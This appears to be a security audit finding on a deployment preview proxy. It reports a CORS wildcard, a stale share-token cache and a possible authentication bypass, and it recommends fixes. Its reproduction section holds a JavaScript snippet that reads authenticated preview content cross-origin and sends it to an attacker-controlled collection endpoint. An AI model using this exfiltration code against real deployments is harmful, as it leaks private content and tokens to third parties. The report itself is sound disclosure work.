## Description

The deployment preview proxy (`deployment-proxy.ts`) has two compounding issues:

**1. CORS wildcard on authenticated deployment responses:**
```typescript
res.setHeader("Access-Control-Allow-Origin", "*");
res.setHeader("X-MnM-Deployment", deploymentId);
```

This means **any website** can make a cross-origin request to `/preview/:deploymentId/*` and read the response body (even authenticated content). Combined with the `?token=<shareToken>` authentication, this creates a cross-origin data exfiltration path.

**2. 60-second stale share token cache:**
```typescript
const portCache = new Map<string, { port: number; companyId: string; shareToken: string | null; cachedAt: number }>();
const CACHE_TTL_MS = 60_000;
```

If a deployment's share token is rotated or the deployment is terminated, the old token remains valid for up to 60 seconds via the cache. An attacker who captures a share token URL (from logs, browser history, shared link) has a guaranteed 60-second window even after revocation.

**3. Weak authentication bypass logic:**
```typescript
const hasSession = !!(req as any).actor;
const hasValidToken = shareTokenParam && shareTokenParam === info.shareToken;

if (!hasSession && !hasValidToken) {
  res.status(401).json(...);
  return;
}
```

`(req as any).actor` is checked but the actor is set by middleware for **all** requests (even unauthenticated ones as `{ type: "none" }`). The check `!!(req as any).actor` is truthy for `{ type: "none" }` as well — so an unauthenticated request (with `actor = { type: "none" }`) will pass this check and access the deployment proxy without session OR token.

Let me verify: if `req.actor` is always set (even for unauthenticated requests), then `!!req.actor` is always `true`, and the auth check is entirely bypassed.

## Impact

- **CORS wildcard**: A malicious page can read deployment preview content (potentially sensitive agent outputs, internal tools) from any origin.
- **Cache window**: 60 seconds of share token validity after revocation.
- **Potential auth bypass**: If `req.actor` is always set (type="none"), the deployment proxy is accessible without authentication or share token.

## Reproduction (CORS exfil)

```javascript
// From attacker.com:
fetch("https://mnm.example.com/preview/{deploymentId}/?token={shareToken}")
  .then(r => r.text())
  .then(data => fetch("https://attacker.com/collect?data=" + encodeURIComponent(data)));
// Works because Access-Control-Allow-Origin: * allows cross-origin reads
```

## Recommendation

1. **Replace CORS wildcard** with the specific origin or remove CORS headers for deployment previews (they are not public APIs).
2. **Reduce cache TTL** from 60s to 5s, or invalidate the cache entry when a deployment is stopped.
3. **Fix the actor check**: Use explicit session validation:
```typescript
const hasSession = req.actor?.type === "board" || req.actor?.type === "agent";
```
4. Consider requiring company membership for deployment access, not just a share token.
